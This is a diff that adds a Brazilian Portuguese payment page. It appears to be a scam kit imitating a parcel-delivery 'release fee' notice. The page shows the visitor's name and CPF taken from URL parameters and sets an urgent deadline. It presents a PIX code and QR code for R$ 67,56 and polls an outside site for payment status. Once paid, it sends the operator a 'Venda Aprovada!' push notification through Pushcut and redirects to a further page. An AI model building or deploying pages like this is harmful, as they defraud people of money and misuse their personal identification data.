@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <title>Pagamento PIX</title>
+    <script src="https://cdn.rawgit.com/davidshimjs/qrcodejs/gh-pages/qrcode.min.js"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @font-face {
+            font-family: 'Rawline';
+            src: url("/static/fonts/rawline-400.ea42a37247439622.woff2") format('woff2');
+            font-weight: 400;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("/static/fonts/rawline-600.844a17f0db94d147.woff2") format('woff2');
+            font-weight: 600;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("/static/fonts/rawline-700.1c7c76152b40409f.woff2") format('woff2');
+            font-weight: 700;
+            font-style: normal;
+        }
+        
+        {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Rawline', sans-serif;
+        }
+        body {
+            background-color: #f8f9fa;
+            padding-top: 60px;
+            color: #333333;
+            font-size: 15px;
+            line-height: 1.5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 8px 20px;
+            background-color: white;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            height: 60px;
+        }
+        .logo {
+            width: 140px;
+            height: auto;
+        }
+        .header-icons {
+            display: flex;
+            gap: 15px;
+        }
+        .header-icon {
+            font-size: 18px;
+            color: #0056b3;
+        }
+        .container {
+            max-width: 600px;
+            margin: 7px auto;
+            padding: 0 14px;
+            flex: 1;
+        }
+        .payment-info {
+            background: #e8eced;
+            padding: 12px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            margin-bottom: 13px;
+            border-left: 4px solid #0071AD;
+        }
+        .payment-info h3 {
+            color: #214885;
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 1px;
+        }
+        .qr-container {
+            text-align: center;
+            margin: 10px 0;
+            padding: 12px;
+            background: #e8eced;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            border-left: 4px solid #0071AD;
+            margin-bottom: 13px;
+        }
+        .qr-container2 {
+            text-align: center;
+            margin: 7px 0;
+            margin-bottom: -16px;
+            margin-top: 0px;
+            padding: 4px;
+            background: #e8eced;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            border-left: 4px solid #0071AD;
+        }
+        .qr-code {
+            width: 150px;
+            height: 150px;
+            margin: 0 auto;
+            background: #f8f9fa;
+            padding: 3px;
+            border-radius: 4px;
+        }
+        .pix-code {
+            background: #d2d6d9;
+            padding: 0px;
+            border-radius: 4px;
+            margin: 0px 0;
+            font-family: monospace;
+            word-break: break-all;
+            border: 1px dashed #dee2e6;
+        }
+        .copy-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #0c326f;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin: 14px 0;
+            transition: all 0.3s ease;
+        }
+        .copy-button:hover {
+            background-color: #092555;
+            transform: translateY(-1px);
+        }
+        .warning-box {
+            background-color: #fdc2c2;
+            border: 1px solid #f1a96a;
+            color: #214885;
+            padding: 8px;
+            border-radius: 8px;
+            margin-bottom: 13px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        .warning-box h2 {
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 0px;
+        }
+        .warning-box p {
+            font-size: 18px;
+            margin-bottom: -4px;
+        }
+        .countdown {
+            font-size: 24px;
+            font-weight: bold;
+            color: #f11227;
+            margin-top: -6px;
+            margin-bottom: -6px;
+        }
+        .footer {
+            background-color: #FFE600;
+            color: #0c326f;
+            padding: 16px 0; /* Mantém padding vertical, remove horizontal */
+            text-align: center;
+            margin-top: 22px;
+            width: 100vw; /* Força largura total da viewport */
+            position: relative;
+            left: 50%; /* Posiciona à esquerda da tela */
+            right: 50%; /* Posiciona à direita da tela */
+            margin-left: -50vw; /* Corrige posicionamento */
+            margin-right: -50vw; /* Corrige posicionamento */
+            margin-bottom: 30px;
+            box-shadow: 0 -1px 3px rgba(0,0,0,0.1);
+        }
+        .footer-logo {
+            width: 100px;
+            margin: 0 auto 8px;
+            display: block;
+        }
+        .qr-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            max-width: fit-content;
+            margin: 0 auto;
+        }
+        .qr-content h3 {
+            color: #214885;
+            font-size: 1.1rem;
+            margin-bottom: 5px;
+            font-weight: 600;
+            text-align: center;
+        }
+        .qr-code-wrapper {
+            background: white;
+            padding: 3px;
+            border-radius: 9px;
+            border: 3px solid #f0f0f0;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+        }
+        .qr-code-wrapper .qr-code img {
+            display: block;
+            margin: 0 auto;
+            max-width: 100%;
+        }
+        .qr-container p {
+            color: #333;
+            font-weight: 400;
+            font-size: 15px;
+            
+        }
+        .copy-icon {
+            color: #0c326f;
+            font-size: 18px;
+        }
+        .label-azul {
+            color: #0071AD;
+            font-size: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img alt="teste do brasil" class="logo" src="https://encomendagarantida.com/rastreio/encomenda/images/1.png"/>
+        <div class="header-icons">
+            <i class="fas fa-search header-icon"></i>
+            <i class="fas fa-question-circle header-icon"></i>
+            <i class="fas fa-adjust header-icon"></i>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="warning-box">
+            <h2>ATENÇÃO: <span id="nomeCliente"></span></h2>
+            <p>O seu prazo de regularização termina hoje!</p>
+            <p>Conclua o processo para receber sua encomenda amanhã.</p>
+        </div>
+        <div class="payment-info">
+            <h3>Detalhes do Pagamento</h3>
+            <p><strong class="label-azul">Taxa de Liberação</strong></p>
+            <p><strong>CPF:</strong> <span id="cpfCliente"></span></p>
+            <p><strong>Valor:</strong> R$ <span id="valorPix">67,56</span></p>
+        </div>
+
+        <div class="qr-container">
+            <p style="margin-bottom: 10px; font-weight: 600;">Copie o código PIX:</p>
+            <div style="background-color: #ecf4ff; margin-bottom: 13px; padding: 10px 16px; border: 1.8px solid #b3cff3; border-radius: 8px; box-shadow: 0 2px 6px rgba(0,0,0,0.08); overflow-x: auto;">
+                <div style="display: flex; align-items: center; justify-content: space-between; gap: 10px;">
+                    <div id="pixCode" style="flex: 1; font-family: monospace; font-size: 16px; color: #333; white-space: nowrap; overflow-x: auto;">
+                        <!-- Aqui o código Pix já deve ser inserido via JS existente -->
+                    </div>e
+                    <button onclick="copyPixCode()" style="background: none; border: none; cursor: pointer;">
+                        <i class="fas fa-copy" style="color: #0071AD; font-size: 18px;"></i>
+                    </button>
+                </div>
+            </div>
+
+            <button onclick="copyPixCode()" class="copy-button" style="margin-top: 10px; background-color: #0a66b5;">
+                <i class="fas fa-copy"></i> Copiar código do QR Code
+            </button>
+            <p>1. Abra o ambiente do Pix do seu banco ou instituição financeira.</p>
+            <p>2. Copie o código em "Copiar código do QR Code" e selecione no seu app a opção "Pix Copia e Cola"</p>
+        </div>     
+        <div class="qr-container2">
+            <div class="qr-content">
+                <h3>Escaneie o QR Code PIX</h3>
+                <div class="qr-code-wrapper">
+                    <div id="qrCode" class="qr-code"></div>
+                </div>
+                <p>1. Abra o ambiente do Pix do seu banco ou instituição financeira.</p>
+                <p>2. Escolha a opção "Pagar com QR Code" e escaneie o código.</p>
+            </div>
+        </div>
+        <div id="paymentStatus" style="display: none;"></div>
+    </div>
+
+    <footer class="footer">
+        <img src="https://encomendagarantida.com/rastreio/encomenda/images/1.png" alt="teste do brasil Logo" class="footer-logo">
+        <p>© 2025 do Brasil. Todos os direitos reservados.</p>
+    </footer>
+
+    <script src="https://cdn.rawgit.com/davidshimjs/qrcodejs/gh-pages/qrcode.min.js"></script>
+<script>
+let notificationSent = false;
+let checkCount = 0;
+const maxChecks = 200;
+
+function verificarStatusPagamento() {
+    const pixData = JSON.parse(sessionStorage.getItem('pix_data1') || '{}');
+
+    if (!pixData.externalId) {
+        console.error("❌ externalId não encontrado em sessionStorage.pix_data1");
+        return;
+    }
+
+    const transactionId = pixData.externalId;
+
+    fetch(`https://seupedidorastreado.site/api/v1/payment-status.php?id=${transactionId}`)
+        .then(response => {
+            if (!response.ok) throw new Error(`Erro HTTP: ${response.status}`);
+            return response.json();
+        })
+        .then(data => {
+            checkCount++;
+            console.log(`🔄 Tentativa ${checkCount}:`, data);
+
+            if (data.status === 'PAID') {
+                console.log("✅ Pagamento confirmado!");
+                
+                // Limpa sessionStorage após confirmação
+                sessionStorage.removeItem("pix_data1");
+                sessionStorage.removeItem("pixData");
+                sessionStorage.removeItem("externalId");
+                sessionStorage.removeItem("pixCode");
+                sessionStorage.removeItem("status");
+                
+                if (!notificationSent) {
+                    fetch("https://api.pushcut.io/wciBAFXDTHO-VzCOtbMzP/notifications/RBRFRONT", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            title: "Venda Aprovada!",
+                            message: "Seu pagamento via Pix foi processado com sucesso."
+                        })
+                    }).then(() => {
+                        console.log("📲 Notificação enviada com sucesso.");
+                        notificationSent = true;
+                    }).catch(err => console.error("❌ Erro ao enviar notificação:", err));
+                }
+
+                // Redireciona após confirmação
+                setTimeout(() => {
+                    const urlParams = new URLSearchParams(window.location.search);
+                    const cpf = urlParams.get('cpf');
+                    const nome = urlParams.get('nome');
+
+                    if (cpf && nome) {
+                        window.location.href = `/up1/?cpf=${encodeURIComponent(cpf)}&nome=${encodeURIComponent(nome)}`;
+                    } else {
+                        console.error("⚠️ CPF ou nome ausentes na URL");
+                    }
+                }, 2000);
+            } else {
+                if (checkCount < maxChecks) {
+                    setTimeout(verificarStatusPagamento, 3000);
+                } else {
+                    console.warn("⏳ Limite de verificações atingido. Encerrando.");
+                }
+            }
+        })
+        .catch(error => {
+            console.error("❌ Erro ao verificar status:", error);
+            if (checkCount < maxChecks) {
+                setTimeout(verificarStatusPagamento, 3000);
+            }
+        });
+}
+
+// Inicia verificação assim que a página estiver pronta
+document.addEventListener("DOMContentLoaded", verificarStatusPagamento);
+</script>
+
+    <script>
+        function formatarCPF(cpf) {
+            cpf = cpf.replace(/\D/g, '');
+            return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+        }
+
+        function copyPixCode() {
+            const pixCode = document.getElementById('pixCode').textContent.trim();
+            const copyButton = document.querySelector('.copy-button');
+            navigator.clipboard.writeText(pixCode).then(
+                function() {
+                    copyButton.innerHTML = '<i class="fas fa-check"></i> Código Copiado';
+                    copyButton.style.backgroundColor = '#28a745';
+                    setTimeout(() => {
+                        copyButton.innerHTML = '<i class="fas fa-copy"></i> Copiar código PIX';
+                        copyButton.style.backgroundColor = '#0c326f';
+                    }, 2000);
+                },
+                function(err) {
+                    console.error('Erro ao copiar:', err);
+                    copyButton.innerHTML = '<i class="fas fa-times"></i> Erro ao copiar';
+                    copyButton.style.backgroundColor = '#dc3545';
+                }
+            );
+        }
+
+        document.addEventListener("DOMContentLoaded", function () {
+            const pixData = JSON.parse(sessionStorage.getItem("pix_data1") || '{}');
+            if (!pixData.pix || !pixData.externalId) {
+                document.getElementById("pixCode").innerText = "Erro: Pix não encontrado.";
+                return;
+            }
+
+            document.getElementById("pixCode").innerText = pixData.pix;
+            const urlParams = new URLSearchParams(window.location.search);
+            document.getElementById("nomeCliente").innerText = decodeURIComponent(urlParams.get('nome') || '');
+            document.getElementById("cpfCliente").innerText = formatarCPF(urlParams.get('cpf') || '');
+
+            new QRCode(document.getElementById("qrCode"), {
+                text: pixData.pix,
+                width: 200,
+                height: 200,
+                colorDark: "#000000",
+                colorLight: "#ffffff",
+                correctLevel: QRCode.CorrectLevel.H
+            });
+
+            const data = new Date();
+            data.setDate(data.getDate() + 1);
+            const meses = ['Janeiro','Fevereiro','Março','Abril','Maio','Junho','Julho','Agosto','Setembro','Outubro','Novembro','Dezembro'];
+            document.getElementById("data-leilao").innerText =
+                data.getDate() + ' de ' + meses[data.getMonth()] + ' de ' + data.getFullYear();
+        });
+    </script>
+</body>
+</html>
